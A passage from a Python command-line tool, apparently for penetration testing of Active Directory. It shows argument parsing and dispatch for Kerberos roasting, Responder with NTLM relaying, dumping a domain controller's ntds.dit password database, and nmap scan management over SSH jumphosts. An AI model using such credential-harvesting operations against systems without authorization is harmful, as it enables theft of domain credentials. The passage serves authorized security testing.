    roasting_parser.add_argument("-jumphost", "-jh", required=True, help="SSH host to run the command from")
    roasting_parser.add_argument("-dc-ip", "-dc", required=True, help="Target DC or AD machine IP")
    roasting_parser.add_argument("-user", "-u", required=True, help="Active Directory user. Example: admin@marvel.local")
    roasting_parser.add_argument("-password", "-p", required=True, help="Ehm Password of that user?")
    roasting_parser.add_argument("-domain", "-d", required=True, help="target domain. Example: marvel.local")    

    responder_parser = subparsers.add_parser("responder", help="Start responder on target host.")
    responder_parser.add_argument("-jumphost", "-jh", required=True, help="SSH host to run the command from. If you provide a config file it will check all hosts for smb signing and run responder+ntlmrelayx in socks mode.")
    responder_parser.add_argument("--config_file", "-c", help="Path to YAML configuration file")

    pasaudit_parser = subparsers.add_parser("pass-audit", help="This will grab ntds.dit file, all enabled usersl, all high priv users, and dump the ntds.dit(this is done locally).")
    pasaudit_parser.add_argument("-jumphost", "-jh", required=False, help="SSH jumphost to run the command from, if there is one.")
    pasaudit_parser.add_argument("-dc-ip", "-dc", required=True, help="Target DC or AD machine IP")
    pasaudit_parser.add_argument("-user", "-u", required=True, help="Active Directory user. Example: admin@marvel.local")
    pasaudit_parser.add_argument("-password", "-p", required=True, help="Ehm Password of that user?")
    pasaudit_parser.add_argument("-domain", "-d", required=True, help="target domain. Example: marvel.local")
    pasaudit_parser.add_argument("-verbose", "-v", required=False, action=argparse.BooleanOptionalAction, help="Verbose output. You will see each running command and it's output.")
    
    parse_parser = subparsers.add_parser("parse", help="Parse nmap output. - Not ready yet. It does nothing :).")
    parse_parser.add_argument("--nmap-output", "-n", required=True, help="Path to nmap output directory or file.  Not ready yet. It does nothing :).")

    args = parser.parse_args()

    if args.mode == 'network-scans':
        config = load_config(args.config_file)
        # validate_access(config)

        if args.live :
            scans = process_host(config, True)
        else:
            scans = process_host(config)

        
        # print(scans)

        # Process each host in sequence (parallelism is per-host) it will start the scans with xargs and with a default of 2 processes per host or more if you devine them in the config file
        # for host_config in config['hosts']:
        
            # scans = process_host(host_config)
            # print(scans)
            # start_nmaps(scans, host_config)

    if args.mode == 'monitor-scans': # check wether scans finished or not
        config = load_config(args.config_file)

        print('monitoring NOW !!!')

        while True:
            for host in config['hosts']:
                print(f"\n{color_text('Checking status scans on:', Color.BOLD)} {host['name']}")
                checker(host)
            time.sleep(10)

    if args.mode == 'scan-results':
        config = load_config(args.config_file)
        for host in config['hosts']:
            print(f"\n{color_text('Downloading scans from:', Color.BOLD)} {host['name']}")

    if args.mode == 'users':
        en_users(args.jumphost, args.dc_ip, args.user, args.password, args.domain)

    if args.mode == 'roasting':
        roasting(args.jumphost, args.dc_ip, args.user, args.password, args.domain)        

    if args.mode == 'responder':

        if args.config_file : 
            config = load_config(args.config_file)
            # validate_access(config)
            responder_run(args.jumphost, config)
        else:
            responder_run(args.jumphost)

    if args.mode == 'pass-audit':
        if args.jumphost:
            pas_audit(args.dc_ip, args.user, args.password, args.domain, args.jumphost, args.verbose)
        else:
            pas_audit(args.dc_ip, args.user, args.password, args.domain)

    if args.mode == 'parse' :
        print('Hello')

    close_all_ssh_connections()
    
if __name__ == "__main__":
    main()
